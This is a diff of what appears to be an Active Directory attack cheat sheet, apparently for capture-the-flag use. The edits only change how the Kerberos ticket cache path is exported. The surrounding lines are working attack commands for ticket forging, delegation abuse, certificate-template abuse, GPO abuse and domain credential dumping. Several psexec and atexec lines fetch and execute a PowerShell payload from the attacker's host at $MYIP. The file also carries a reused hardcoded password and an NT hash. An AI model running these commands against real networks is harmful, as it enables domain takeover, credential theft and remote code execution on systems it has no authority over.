@@ -177,7 +177,7 @@ unzip backup.zip -d .
 
 ## Valid Creds
 sudo skewme $TARGET
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='$USERNAME.ccache'
 impacket-GetADUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -all | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee usernames
 impacket-GetADComputers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass | awk '/---/{flag=1;next} flag {print $1}' | tr '[:upper:]' '[:lower:]' | tee computers
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
@@ -202,8 +202,8 @@ impacket-atexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powersh
 impacket-psexec -dc-ip $TARGET $DOM/'administrator':'$PASSWORD'@$TARGET "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-atexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':' "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'; export KRB5CCNAME=`pwd`/administrator.ccache;
-impacket-getTGT -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':'; export KRB5CCNAME=`pwd`/administrator.ccache;
+impacket-getTGT -dc-ip $TARGET $DOM/'administrator':'123qweasdF!'; export KRB5CCNAME='administrator.ccache'
+impacket-getTGT -dc-ip $TARGET $DOM/'administrator'@$TARGET -hashes ':'; export KRB5CCNAME='administrator.ccache'
 impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 impacket-psexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:8888/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
 Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Get-Content "$($_.FullName)\Desktop\user.txt","$($_.FullName)\Desktop\root.txt" -ErrorAction SilentlyContinue }
@@ -469,10 +469,10 @@ https://datafetcher.com/graphql-json-body-converter
 https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='$USERNAME.ccache'
 
 +---------- AddSelf ----------+
-bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; export KRB5CCNAME='$USERNAME.ccache'
 
 +---------- GenericWrite ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
@@ -573,8 +573,8 @@ WriteOwner
 https://github.com/ly4k/Certipy/wiki/05-%E2%80%90-Usage
 
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':'; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='$USERNAME.ccache'
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes ':'; export KRB5CCNAME='$USERNAME.ccache'
 
 +---------- ESC7 ----------+
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -add-officer '$USERNAME' -target $DC
@@ -582,7 +582,7 @@ certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template 'Su
 certipy ca -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -issue-request ''
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -retrieve ''
 certipy auth -dc-ip $TARGET -domain $DOM -pfx 'administrator.pfx'
-export KRB5CCNAME=`pwd`/administrator.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
+export KRB5CCNAME='administrator.ccache'; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c type \\Users\\Administrator\\Desktop\\root.txt" | grep -v '\['
 
 +---------- Request ----------+
 certipy req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca "$CA" -template '' -upn 'Administrator' -target $DC -key-size '4096'
@@ -620,7 +620,7 @@ Get-GPPermission -Name "Default Domain Controllers Policy" -TargetName "GPO Mana
 +---------- Execute ----------+
 python3 pygpoabuse.py -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -taskname 'Custom Task' -gpo-id '6ac1786c-016f-11d2-945f-00c04fb984f9'
 gpupdate /force
-impacket-getTGT -dc-ip $TARGET $DOM/'myadmin':'123qweasdF!'; export KRB5CCNAME=`pwd`/myadmin.ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
+impacket-getTGT -dc-ip $TARGET $DOM/'myadmin':'123qweasdF!'; export KRB5CCNAME='myadmin.ccache'; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -v '\['
 
 [*] Cracking
 +---------- PFX ----------+
@@ -825,15 +825,15 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (88) Kerberos
 +---------- .ccache ----------+
-impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; export KRB5CCNAME=`pwd`/$USERNAME.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME' -hashes :8846F7EAEE8FB117AD06BDD830B7586C; export KRB5CCNAME='$USERNAME.ccache'
 
 +---------- Kerberos .ccache Negotiation ----------+
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-findDelegation -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass
 impacket-addcomputer -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -computer-name mypc -computer-pass '123qweasdF!'
 impacket-rbcd -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -action write -delegate-from mypc$ -delegate-to DC$
-impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME=`pwd`/mypc$.ccache
-impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; export KRB5CCNAME=`pwd`/administrator.ccache
+impacket-getTGT -dc-ip $TARGET $DOM/'mypc$':'123qweasdF!'; export KRB5CCNAME='mypc$.ccache'
+impacket-getST -dc-ip $TARGET $DOM/mypc$ -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache; export KRB5CCNAME='administrator.ccache'
 impacket-secretsdump -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass -just-dc-user administrator
 evil-winrm -i $TARGET -u administrator -H ''
 
@@ -853,7 +853,7 @@ impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request | aw
 echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut -d ' ' -f 2 | sed 's/.*/\U&/' >> silver-ticket; cat silver-ticket
 
 -->> Create Ticket
-cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; export KRB5CCNAME=`pwd`/administrator.ccache
+cat silver-ticket | { read a; read _; read c; impacket-ticketer -domain $DOM -domain-sid "$a" -spn "cifs/$DC" -nthash "$c" administrator 2>/dev/null; }; export KRB5CCNAME='administrator.ccache'
 
 +---------- Golden Ticket ----------+
 impacket-goldenPac -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'@$DC
